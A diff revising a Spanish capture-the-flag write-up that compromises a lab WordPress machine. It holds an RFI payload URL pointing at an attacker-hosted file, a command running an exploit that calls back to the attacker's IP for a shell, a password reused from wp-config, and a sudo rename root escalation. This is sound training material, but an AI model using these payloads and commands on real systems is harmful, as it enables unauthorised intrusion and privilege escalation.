@@ -2,9 +2,31 @@
 Estado: Completado
 Plataforma: Vulnix
 SO: Linux
-Dificultad: Facil
+Dificultad: Fácil
 VectorInicial: RFI
+ServicioInicial: HTTP
+PuertoInicial: 80
+Credenciales:
+ - tiago: WPr00t3d123!
+Usuarios:
+ - www-data
+ - tiago
+ - root
 Privesc: Sudo rename
+Tecnicas:
+ - Network Discovery
+ - Service Enumeration
+ - WordPress Enumeration
+ - Remote File Inclusion
+ - Credential Reuse
+ - User Pivoting
+ - Sudo Privilege Escalation
+Herramientas:
+ - arp-scan
+ - gomap
+ - dirb
+ - wpscan
+ - penelope
 Fecha: 2026-02-23
 ---
 <img width="585" height="397" alt="Pasted image 20260218113338" src="https://github.com/user-attachments/assets/9379e35f-eb30-4de0-a170-c3ab4a599357" />
@@ -25,7 +47,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 1.963 seconds (130.41 hosts/sec). 3 responded
 ```
 
-Como podemos observar la IP es ***10.0.11.12*** así que empezaremos con el reconocimiento de puertos y servicios.
+Como podemos observar, la IP es **10.0.11.12**, así que empezaremos con el reconocimiento de puertos y servicios.
 
 ```bash
  settarget 10.0.11.12            
@@ -50,7 +72,7 @@ Solo tenemos 2 puertos abiertos:
 
 Vamos a ver que tenemos en la web de este laboratorio.
 
-Nos encontramos con la pagina por defecto de Apache, así que tendremos que realizar una enumeración de directorios a ver que encontramos.
+Nos encontramos con la página por defecto de Apache, así que tendremos que realizar una enumeración de directorios a ver qué encontramos.
 
 ```bash
  dirb http://$TARGET
@@ -76,11 +98,11 @@ GENERATED WORDS: 4612
 <skip>
 ```
 
-Bueno, parece que estamos frente a un *Wodpress* así que vamos a mirar la web a ver si podemos ver algo interesante que podamos usar.
+Bueno, parece que estamos frente a un *WordPress*, así que vamos a mirar la web a ver si encontramos algo interesante que podamos usar.
 
 <img width="268" height="312" alt="Pasted image 20260223110618" src="https://github.com/user-attachments/assets/cc1df6fc-b176-48f6-bdd6-b0732f1eda40" />
 
-Curiosamente solo nos aparece texto de mala manera, esto indica que estamos frente a un dominio, al pasar el ratón por encima de *¡Hello World!* vemos que el dominio es **remote.nyx**. ahora tendremos que añadirlo a nuestro */etc/hosts*.
+Curiosamente solo nos aparece texto mal renderizado. Esto indica que estamos frente a un dominio; al pasar el ratón por encima de *¡Hello World!* vemos que el dominio es **remote.nyx**. Ahora tendremos que añadirlo a nuestro `/etc/hosts`.
 
 ```bash
  sudo nano /etc/hosts
@@ -156,9 +178,9 @@ _______________________________________________________________
  <skip>
 ```
 
-Vemos que hay un plugin vulnerable llamado **qwolle-gb** y el usuario **tiago** como ya vimos antes.
+Vemos que hay un plugin vulnerable llamado **gwolle-gb** y el usuario **tiago**, como ya habíamos visto antes.
 
-Buscaremos información del plugin a ver si no es necesario iniciar sesión para explotar las vulnerabilidades.
+Buscaremos información del plugin para ver si no es necesario iniciar sesión para explotar las vulnerabilidades.
 
 En la web de [Explot Database](https://www.exploit-db.com/exploits/38861) encontramos que este plugin es vulnerable a un Remote File Inclusión (RFI) y nos indica la forma de proceder.
 
@@ -166,11 +188,11 @@ En la web de [Explot Database](https://www.exploit-db.com/exploits/38861) encont
 http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
 ```
 
-Así mismo hay exploit en *GitHub* que ayudan a automatizar esta explotación.
+Así mismo, hay exploits en *GitHub* que ayudan a automatizar esta explotación.
 
 [CVE-2015-8351](https://github.com/NexusFireMan/Exploits/tree/main/CVE-2015-8351)
 
-Pero yo utilizare el siguiente código.
+Pero yo utilizaré el siguiente código.
 
 ```python
 import requests
@@ -252,9 +274,9 @@ Una vez a la escucha ejecutamos el exploit para tener acceso a la maquina victim
  python3 exploit.py http://remote.nyx/wordpress 10.0.11.11 443 8000
 ```
 
-Este exploit solicita la dirección donde se encuentra *Wordpress*, después la *ip de atacante*, el *puerto de atacante* y por ultimo el *puerto donde se servirá el payload*.
+Este exploit solicita la dirección donde se encuentra *WordPress*, después la *IP del atacante*, el *puerto del atacante* y, por último, el *puerto donde se servirá el payload*.
 
-Con esto ya tendremos acceso a la maquina objetivo.
+Con esto ya tendremos acceso a la máquina objetivo.
 
 Ahora toca la escalada de privilegios, empecemos a probar.
 
@@ -269,7 +291,7 @@ www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/ca
 tiago
 ```
 
-Curiosamente tenemos un usuario con el mismo nombre que en *wordpress* esto nos puede dar indicios de una *reutilización de contraseña* así que en otro terminal intentaremos encontrar la contraseña de este usuario y ademas en la actual buscaremos si existe algún *SUID*.
+Curiosamente tenemos un usuario con el mismo nombre que en *WordPress*. Esto nos puede dar indicios de una *reutilización de contraseña*, así que en otro terminal intentaremos encontrar la contraseña de este usuario y, además, en la sesión actual buscaremos si existe algún *SUID*.
 
 ```bash
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ find / -perm -4000 2>/dev/null 
@@ -286,7 +308,7 @@ www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/ca
 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 ```
 
-Estos fichero no tienen un uso relevante para la escalada de privilegios, pero *ssh-keysign* puede ser interesante, probemos otras vías antes.
+Estos ficheros no tienen un uso relevante para la escalada de privilegios, pero *ssh-keysign* podría ser interesante. Probemos otras vías antes.
 
 ```bash
  wpscan --url http://remote.nyx/wordpress/ -U tiago -P /usr/share/wordlists/rockyou.txt
@@ -314,7 +336,7 @@ define( 'DB_PASSWORD', 'WPr00t3d123!' );
 <skip>
 ```
 
-Ahora tenemos una contraseña así que tendremos que probar si nos sirve.
+Ahora tenemos una contraseña, así que tendremos que probar si nos sirve.
 
 ```bash
 www-data@remote:/var/www/html/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha$ su tiago
@@ -333,9 +355,9 @@ User tiago may run the following commands on remote:
     (root) NOPASSWD: /usr/bin/rename
 ```
 
-Ahora si tenemos un vector de ataque claro para conseguir acceso como **root**.
+Ahora sí tenemos un vector de ataque claro para conseguir acceso como **root**.
 
-Lo primero que haremos sera crear un fichero para usar como dummy y nos permita el uso de *rename*.
+Lo primero que haremos será crear un fichero de prueba que nos permita usar `rename`.
 
 ```bash
 touch test.txt
@@ -347,4 +369,4 @@ Ahora solo tenemos que ejecutar el siguiente comando para ser *root*.
 sudo rename -e 'system("/bin/bash")' test.txt
 ```
 
-Con esto ya tenemos comprometida la maquina.
+Con esto ya tenemos comprometida la máquina.
